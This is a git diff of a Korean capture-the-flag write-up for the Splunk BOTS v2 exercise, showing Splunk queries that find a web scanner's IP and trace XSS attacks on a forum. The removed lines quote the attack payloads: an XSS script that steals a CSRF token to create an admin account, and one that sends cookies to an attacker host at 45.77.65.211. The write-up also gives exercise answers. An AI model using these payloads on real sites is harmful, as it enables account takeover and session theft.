@@ -87,7 +87,7 @@ sourcetype=stream:http www.brewertalk.com
 |brewertalk.com|172.31.4.249|
 
 www.brewertalk.com의 dest_ip의 값을 보면 172.31.4.249와 52.42.208.228이 있습니다.
-문제에서 공개IP를 물어봤으니 사설IP대역은 172.31.4.249이 아닌, 52.42.208.228이 공개 IP입니다.
+문제에서 공개IP를 물어봤으니 사설IP대역 172.31.4.249이 아닌, 52.42.208.228이 공개 IP입니다.
 
 답 : 52.42.208.228
 
@@ -96,20 +96,29 @@ www.brewertalk.com에 대해 웹 취약점 스캔을 실행하는 데 사용되�
 
 <details>
   <summary>hint#1</summary>
-  App scanners are often 'noisy' and therefore easy to detect with automated correlation searches.<br>
-  앱 스캐너는 '잡음'일 경우가 많기 때문에 자동화된 상관 관계 검색으로 쉽게 감지할 수 있습니다.
+    App scanners are often 'noisy' and therefore easy to detect with automated correlation searches.<br>
+    앱 스캐너는 '잡음'일 경우가 많기 때문에 자동화된 상관 관계 검색으로 쉽게 감지할 수 있습니다.
 </details>
 
 <details>
   <summary>hint#2</summary>
-  Drill down into contributing events if you can!<br>
-  가능하면 기여 이벤트를 자세히 살펴보십시오!
+    Drill down into contributing events if you can!<br>
+    가능하면 기여 이벤트를 자세히 살펴보십시오!
 </details>
+
+어떤 url들이 scan당했는지 조사해봅니다.
+
+```
+sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
+| stats count by url
+```
+
+**http://www.brewertalk.com/숫자/**형식으로 scan을 하고있습니다.  
+해당 src_ip를 보면 **45.77.65.211**입니다.
 
 scan이면 request 횟수가 많을것입니다.
 
 www.berkbeer.com의 ip(52.42.208.228, 172.31.4.249)를 dest_ip로 설정하고 count해봅시다.
-그리고, header에 
 
 쿼리결과를 토대로 검증해봅니다.(스캔치고 이벤트 수가 적습니다.)
 
@@ -119,7 +128,8 @@ sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
 | sort -count
 ```
 
-|src_ip	dest_ip	count
+|src_ip|dest_ip|count|
+|---|---|---|
 |45.77.65.211|172.31.4.249|9708|
 |52.40.10.231|172.31.4.249|634|
 |172.31.10.10|52.42.208.228|303|
@@ -128,6 +138,15 @@ sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
 |10.0.2.109|52.42.208.228|84|
 |136.0.2.138|172.31.4.249|24|
 |136.0.0.125|172.31.4.249|8|
+
+**45.77.65.211**의 이벤트가 가장 많습니다.
+
+45.77.65.211가 어떤 url들을 요청했는지 조사 합시다.
+
+```
+sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249 src_ip=45.77.65.211
+| stats values(url) by src_ip
+```
 
 답 : 45.77.65.211
 
@@ -355,38 +374,14 @@ sourcetype=stream:http "<script>"
 | table _time decoded src_ip
 ```
 
-|_time|decoded|src_ip|
-|---|---|---|
-|2017/08/16 15:19:17.163|module=user-titles&action=edit&utid=2"><script>
-window.onload=function(e){
-  var my_post_key = document.getElementsByName("my_post_key")[0].value
-  console.log(my_post_key);
-  var postdata= "my_post_key="+my_post_key+"&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4";//Post the Data
-  var url = "http://www.brewertalk.com/admin/index.php?module=user-users&action=add";
-  var http;
-  http = new XMLHttpRequest();
-  http.open("Post",url);
-
-  http.setRequestHeader('Accept','text/html');
-  http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-  http.setRequestHeader('Accept','application/xhtml+xml');
-  http.setRequestHeader('Accept','application/xml');
-  http.send(postdata);
-  console.log(my_post_key);
-}
-
-```
-</script>|71.39.18.125|
-|2017/08/15 23:36:34.915|action=activate&uid=-1&code="><script>document.location="hxxp://45.77.65.211:9999/microsoftuserfeedbackservice?metric=" + document.cookie;</script>|71.39.18.125|
-|2017/08/12 09:49:00.520|action=activate&uid=-1&code="><script>('대동')</script>|136.0.0.125|
-```
+![]({{site.url}}/assets/built/images/bots/v2/2021-11-02-12-01-02.png)
 
 쿼리 결과 중 '대동'이라는 글자를 발견할 수 있습니다.
 
 답 : 대동
 
 207	What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.  
-XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠키의 가치는 무엇이었습니까? 답변 안내: 모두 숫자입니다. 쿠키 이름이나 등호와 같은 기호가 아닙니다.
+XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠키값은 무엇이었습니까? 답변 안내: 모두 숫자입니다. 쿠키 이름이나 등호와 같은 기호가 아닙니다.
 
 <details>
   <summary>hint#1</summary>
@@ -400,7 +395,7 @@ XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠�
     uri_query 필드를 검사합니다.
 </details>
 
-kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, "<\script>", cookie를 넣어 검색해 봅시다.
+kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, "<script>", cookie를 넣어 검색해 봅시다.
 
 ```
 sourcetype=stream:http *kevin* "<script>" *cookie*
